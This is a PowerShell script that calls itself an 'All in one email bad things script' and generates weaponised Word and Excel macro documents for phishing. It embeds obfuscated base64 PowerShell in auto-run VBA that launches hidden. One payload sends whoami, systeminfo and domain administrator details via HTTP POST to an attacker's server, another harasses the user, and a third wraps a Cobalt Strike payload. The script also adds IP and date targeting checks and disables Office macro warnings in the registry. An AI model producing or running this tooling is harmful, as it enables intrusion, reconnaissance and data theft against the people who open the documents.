function convertto-vba ($script, $lengthoflines=800)
{
$bytes = [system.text.encoding]::unicode.getbytes($script)
$scripttoconvert = [convert]::tobase64string($bytes)
#12190 bytes is the largest size a scriptblock can be
#not sure anymore ran a script 18k bytes
if ($scripttoconvert.length -gt 9999999){
Throw "Base64'd script is too large to be invoked, shorten script"}
$length = $scripttoconvert.Length
$all = new-object collections.generic.list[string]
do{
$lastchar = $lengthoflines
if ($length -lt $lengthoflines){
    $lastchar = $scripttoconvert.length}
    $redo = $true
    do{$random = -join ((65..90) | get-random -count 4 | % {[char]$_})
    if($random -in "end","sub","xor"){$redo=$False}
    if(get-variable -name $random -ErrorAction ignore){$redo = $False}
    }
until($redo)
New-Variable -Name $random -value ($scripttoconvert.Substring(0,$lastchar)) 
$all.add("$random")
$scripttoconvert = $scripttoconvert.Remove(0,$lastchar)
$length = $scripttoconvert.length
}
while($length -gt 0)
#output
$finalvariable = -join ((65..90) + (97..122) | get-random -count 4 | % {[char]$_}) 
$total = @()
foreach ($varname in $all){$total+="Dim $varname as String"}
$total+="Dim $finalvariable as String"
$total+="Dim getowned as String"
$total+="Dim obj"
foreach ($value in $all){
$data = Get-Variable $value -ValueOnly
if ($data){
$total+="$value = `"$data`""}}
switch($all.count){
{$_ -lt 100} {
$laststring = $all[0..($all.count)] -join ' + '
$total+="$finalvariable=$laststring"
break}
{$_ -lt 200} {
$laststring = $all[0..100] -join ' + '
$total+="$finalvariable=$laststring"
$laststring2 = $all[101..($all.count)] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring2"
break}
{$_ -lt 300} {
$laststring = $all[0..100] -join ' + '
$total+="$finalvariable=$laststring"
$laststring2 = $all[101..200] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring2"
$laststring3 = $all[201..($all.count)] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring3"
break}
{$_ -lt 400} {
$laststring = $all[0..100] -join ' + '
$total+="$finalvariable=$laststring"
$laststring2 = $all[101..200] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring2"
$laststring3 = $all[201..300] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring3"
$laststring4 = $all[301..($all.count)] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring4"
break}
Default {"script too long"}
}
$total+='gotowned = "powershell.exe -nop -w hidden -enc """ & '+$finalvariable+' & """"'
$total+=@"
Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "cmd.exe", "/c" + getowned, "C:\Windows\System32", Null, 0
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
"@
return $total
}
Function get-filename($title, $filter)
{
[System.Reflection.Assembly]::LoadWithPartialName("System.windows.forms")|out-null
$desktopdir = [Environment]::GetFolderPath("Desktop")
$openfiledialog = New-Object System.Windows.Forms.OpenFileDialog
$openfiledialog.InitialDirectory = $desktopdir
$openfiledialog.filter = $filter
$openfiledialog.Title = $title
$result = $openfiledialog.ShowDialog()
if ($result -eq "OK"){
$openfiledialog.FileName
}
else{write-host "No file chosen";break}}
function encode-text ($plaintext, $key)
{
    $tonumbers = [int[]][char[]]$plaintext -join ' '
    $cyphertext = ""
    $plainarray = $tonumbers.tostring().tochararray()
    for($i = 0; $i -lt $plainarray.length; $i++){
        $cyphertext += [char]([byte][char]$plainarray[$i] -bxor $Key[$i % $key.length])}
    return $cyphertext
}
function cobaltstrike-encode ($CSfilename)
{
$base64string = get-content -path $CSfilename -raw -encoding utf8
$base64string -match 'FromBase64String\(.(.*).\)' | out-null
$base64 = $matches[1]
#encode base64string with our bxor
$bxordb64= encode-text $base64 "a"
#insert bxord string into cobalt strike and tell powershell how to decode
$appendbxord = @"
`$encoded = '$bxordb64'
`$base64decode = decode-text `$encoded 'a'
"@
#this is a here string to escape all the variables and quotes
$newcode = '[Byte[]]$var_code = [System.Convert]::FromBase64String("$base64decode")'
$appenddecode = @'
function decode-text ($cyphertext, $key)
{
    $decrypted=@()
    $keyarray = $key.ToCharArray()
    for($i = 0; $i -lt $cyphertext.length; $i++){
        $decrypted +=[char]([char][byte]$cyphertext[$i] -bxor $key[$i % $key.length])}
    $decoded = [char[]][int[]]($decrypted -join '' -split ' ') -join ''
    return $decoded
        }
'@

$cobaltpayload = get-content -path $CSfilename
$cobaltpayload = $cobaltpayload -notmatch "FromBase64String"
$cobaltpayload=$cobaltpayload|ForEach-Object {
    $_
    if ($_ -match ("@'"))
    {
$appenddecode
$appendbxord
$newcode
    }}
$cobaltpayload = $cobaltpayload | out-string
convertto-vba $cobaltpayload 900}
function new-vbaiprange ($start, $end)
{
$iparray= @()
$ip1 = ([System.Net.IPAddress]$start).GetAddressBytes()
[Array]::Reverse($ip1)
$ip1 = ([System.Net.IPAddress]($ip1 -join '.')).Address
$ip2 = ([System.Net.IPAddress]$end).GetAddressBytes()
[Array]::Reverse($ip2)
$ip2 = ([System.Net.IPAddress]($ip2 -join '.')).Address
for ($x = $ip1;$x -le $ip2;$x++){
    $ip = ([System.Net.IPAddress]$x).GetAddressBytes()
    [Array]::Reverse($ip)
    $iparray+=$ip -join '.'
}
$attackips = ($iparray|%{"`"$_`""}) -join ", "
$iprangeformat = "targets = Array($attackips)"
#figure out how many lines we'll need since vba strings can't be longer than 900ish characters
$index = [math]::Floor($iprangeformat.Length/900)
#max continuation of 25 lines
if ($index -gt 25){write-warning "Too many IPs, choose smaller amount"; exit}
$i = 0
$lastcomma = 0
$vbaiprangearray = @()
#grab 900 characters, then find the last comma in that substring and add it to the array and start over from that comma
if ($iprangeformat.length -gt 900){
    while ($i -lt $index)
        {
        $payloadsection = $iprangeformat.substring($lastcomma,900)
        $lastcomma = ($iprangeformat[0..($lastcomma+900)] -join '').LastIndexOf(',')
        $lastpayloadcomma = $payloadsection.LastIndexOf(',')
        $payloadtocomma = $payloadsection[0..$lastpayloadcomma]
        $payloadtocomma = ($payloadtocomma -join '').TrimStart(',')
        $vbaiprangearray += $payloadtocomma+" _"
        $i+=1
        }
    }
#grab the last bit of data
$remainingdata = $iprangeformat[$lastcomma..($iprangeformat.Length-1)]
$remainingdata = ($remainingdata -join '').TrimStart(',')
if ($remainingdata -ne 0){
    $vbaiprangearray += $remainingdata
    }
return $vbaiprangearray

}
$vbachecks = @()
$vbachecks = @'
Private startDate As Date
Private endDate As Date
Private targets As Variant
Private fqdns as Variant

Public Function isvalidstartdate() As Boolean
    If startDate < DateTime.Now Then
        isvalidstartdate = True
    Else
        isvalidstartdate = False
    End If
End Function
Public Function isvalidenddate() As Boolean
    If DateTime.Now < endDate Then
        isvalidenddate = True
    Else
        isvalidenddate = False
    End If
End Function
Public Function isvalidip() As Boolean
    Dim objWMIService, IPConfigSet, IPConfig

    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Set IPConfigSet = objWMIService.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled=TRUE")

    For Each IPConfig In IPConfigSet
        If Not IsNull(IPConfig.IPAddress) And Not IsEmpty(IPConfig.IPAddress) Then
            For Each Target In targets
                If IPConfig.IPAddress(0) = Target Then
                    isvalidip = True
                    Exit Function
                End If
            Next
        End If
    Next
    isvalidip = False
End Function
Public Function isvalidfqdn() As Boolean
    Dim objWMIService
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
    For Each objItem In colItems
        strComputerDomain = objItem.Domain
        strComputerName = objItem.DNSHostName
        FQDNcheck = LCase(strComputerName & "." & strComputerDomain)
        For Each fqdn In fqdns
            If LCase(fqdn) = FQDNcheck Then
                isvalidfqdn = True
                Exit Function
            End If
        Next
    Next
    isvalidfqdn = False
End Function
Public Function isvalid()
    If Not IsNull(startDate) Then
        If Not isvalidstartdate() Then
            isvalid = False
            Exit Function
        End If
    End If

    If Not IsNull(endDate) Then
        If Not isvalidenddate() Then
            isvalid = False
            Exit Function
        End If
    End If

    If Not IsNull(targets) And Not IsEmpty(targets) Then
        If Not isvalidip() Then
            isvalid = False
            Exit Function
        End If
    End If

    If Not IsNull(fqdns) And Not IsEmpty(fqdns) Then
        If Not isvalidfqdn() Then
            isvalid = False
            Exit Function
        End If
    End If
    isvalid = True
End Function

'@
$IPCheck = read-host "Enter IP Range?(Attack will only work on these IPS) Y/(N)"
if($IPCheck -eq "Y"){
[ipaddress]$IPrangestart = read-host "Type Starting IP"
[ipaddress]$iprangefinish = read-host "Type Ending IP"
#put ips in pretty format with quotes seperated by commas
$iprangeformat = new-vbaiprange $IPrangestart $iprangefinish | Out-String
}
else{$iprangeformat = "Targets = Null"}

$datechecks = read-host "Enter Start and End Dates? Y/(N)"
if($datechecks -eq "Y"){
do{
try {
#datechecks against regex
[ValidatePattern('^\d\d/\d\d/\d\d\d\d$')]$startdate = read-host "Choose Start Date mm/dd/yyyy"
[ValidatePattern('^\d\d/\d\d/\d\d\d\d$')]$enddate = read-host "Choose End Date  mm/dd/yyyy"
}
catch{}
}until($?)
$startdateformat  = "startDate = #$startdate#"
$enddateformat = "endDate = #$enddate#"
}else{
$startdateformat = "startDate = #12/01/2019#"
$enddateformat = "endDate = #12/01/2020#"
}

$vbachecks += @"
Sub Auto_Open()
$iprangeformat
$startdateformat
$enddateformat
    If Not isvalid() Then
        Exit Sub
    End If

"@

$repeat=$true
while($repeat){
write-host "All in one email bad things script"
write-host "Press 1 to use a VBA macro that extracts systeminfo and exfiltrates with a http POST request to a web ip of your choice"
write-host "Press 2 to use a VBA macro that will change the background and mess with some accessibility features"
write-host "Press 3 to use a VBA macro embedded with a cobalt strike payload (you must have the .txt file from cobalt strikes payload generator on your computer)"
$whichemail = read-host "Press 1 2 3 or X to escape"
switch ($whichemail){
"x"{$repeat=$false;break}
"1"{
[ipaddress]$maliciouslink = read-host "Whats the IP of your webserver?"
$maliciousuri = read-host "Create an inconspicuous URI"
$maliciouscomplete = "http://"+$maliciouslink+":443"+"/"+$maliciousuri
write-host "Document to extract syteminformation chosen.  Using the address of http://$maliciouslink/$maliciousuri"
Write-Host "Ensure you have your POST Server script running to catch the data!"
$postpayload = @()
$postpayload += @'
$exfil = @()
$exfil += whoami
$exfil += systeminfo
try{
Add-type -assemblyname system.directory.services.accountmanagement -erroraction stop
$ct = [system.directoryservices.accountmanagement.contexttype]::Domain
$group=[system.directoryservices.accountmanagement.groupprincipal]::FindByIdentity($ct,'Administrators')
$exfil += $group.getmembers($true) | select samaccountname,lastpasswordset,name,userprincipalname,enabled
}
catch{}
function encode-text ($plaintext, $key)
{
    $tonumbers = [int[]][char[]]$plaintext -join ' '
    $cyphertext = ""
    $plainarray = $tonumbers.tostring().tochararray()
    for($i = 0; $i -lt $plainarray.length; $i++){
        $cyphertext += [char]([byte][char]$plainarray[$i] -bxor $Key[$i % $key.length])}
    return $cyphertext
}
$exfilencode = encode-text ($exfil|out-string) "a"

'@
$postpayload += "Invoke-WebRequest -uri $maliciouscomplete -usedefaultcredentials -method POST -body `$exfilencode -UserAgent (`$([Microsoft.Powershell.Commands.PSUserAgent]::InternetExplorer))"
$vbaencrypted = convertto-vba $postpayload |Out-String
$vbamacro = $vbachecks + $vbaencrypted |Out-String
$repeat=$false
break}#endfirstpayload
"2"{
write-host "Document to troll enduser chosen"
$messwithuser = @()
$messwithuser += @'
$wscript = new-object -com wscript.shell
1..80 | %{$Wscript.sendkeys([char]175)}
$text = "I open random email attachments without care"
add-type -assemblyname system.speech
$tts = new-object system.speech.synthesis.speechsynthesizer
$tts.speak($text)
$source = @"
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyboardSend
{

    public class KeyboardSend
    {
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan,int dwFlags,int dwExtraInfo);

        private const int KEYEVENTF_EXTENDEDKEY = 1;
        private const int KEYEVENTF_KEYUP = 2;

        public static void KeyDown(Keys vKey)
        {keybd_event((byte)vKey, 0, KEYEVENTF_EXTENDEDKEY, 0);
        }
        public static void KeyUp(Keys vKey)
        {keybd_event((byte)vKey, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        }
    }
}

"@
Add-type -TypeDefinition $source -ReferencedAssemblies "System.Windows.Forms"

Function Win ($key)
{
[KeyboardSend.KeyboardSend]::KeyDown("LWin")
[KeyboardSend.KeyboardSend]::KeyDown("$key")
[KeyboardSend.KeyboardSend]::KeyUp("LWin")
}
1..16|%{Win "187";sleep 1}

msg * "Hacked"
'@
$vbaencrypted = convertto-vba $messwithuser | Out-String
$vbamacro = $vbachecks + $vbaencrypted |Out-String
$repeat=$false
break}#end2ndpayload
"3"{
$vbaencrypted= @()

$vbaencrypted += cobaltstrike-encode (get-filename -title "Choose cobalt strike payload" -filter "Powershell/Text Files|*.ps1;*.txt;") | Out-String
$vbamacro = $vbachecks + $vbaencrypted |Out-String



$repeat=$false
break}#end3rdpayload
Default{
write-host "No payload chosen"}
}#end switch
}#end while
$directorylocation = (get-location).path
$setgpo = $directorylocation+"\lgpo.exe"

$template = get-filename -title "Choose your Office Document" -filter "Office Documents|*.doc;*.docx;*.xls;*.xlsx;"
$customname = read-host "What do you want your document to be named?"
if($customname -eq ''){$customname="evildoc"}
switch -Wildcard((gci $template).extension){
"*doc*"{
$word = New-Object -ComObject word.Application
New-ItemProperty -path "HKCU:\Software\Microsoft\Office\$($word.version)\word\Security" -Name AccessVBOM -Value 1 -Force | out-null
New-ItemProperty -path "HKCU:\Software\Microsoft\Office\$($word.version)\word\Security" -Name VBAWarnings -Value 1 -Force | out-null

<#switch ($($word.version))
Potential Social Engineering Code if Necessary
{
    "11.0" {$wordname = "2003"}
    "12.0" {$wordname = "2007"}
    "14.0" {$wordname = "2010"}
    "15.0" {$wordname = "2013"}
    "16.0" {$wordname = "2016"}
    }
#ensure we can access macros for the program
#>

$word.displayalerts = "wdAlertsNone"
$worddoc = $word.documents.open($template)
$docmodule = $worddoc.vbproject.vbcomponents.item(1)
$docmodule.codemodule.addfromstring($vbamacro)
$fullpath = "$pwd\$customname.doc"
$worddoc.saveas([ref]$fullpath, [ref]0)
$worddoc.close()
$word.quit()
}

"*xls*"{
$excel = New-Object -ComObject Excel.Application
New-ItemProperty -path "HKCU:\Software\Microsoft\Office\$($excel.version)\Excel\Security" -Name AccessVBOM -Value 1 -Force | out-null
New-ItemProperty -path "HKCU:\Software\Microsoft\Office\$($excel.version)\Excel\Security" -Name VBAWarnings -Value 1 -Force | out-null

$excel.Visible = $false
$excel.DisplayAlerts = $false
$excelwkbk = $excel.Workbooks.Open($template)
$mod = $excelwkbk.vbproject.vbcomponents.item(1)
$mod.CodeModule.AddFromString($vbamacro)
$fullpath = "$pwd\$customname.xls"
$excelwkbk.SaveAs([ref]$fullpath,[ref]56)
$excelwkbk.close()
$excel.quit()
}

}
write-host "Your Document is Available at $fullpath"
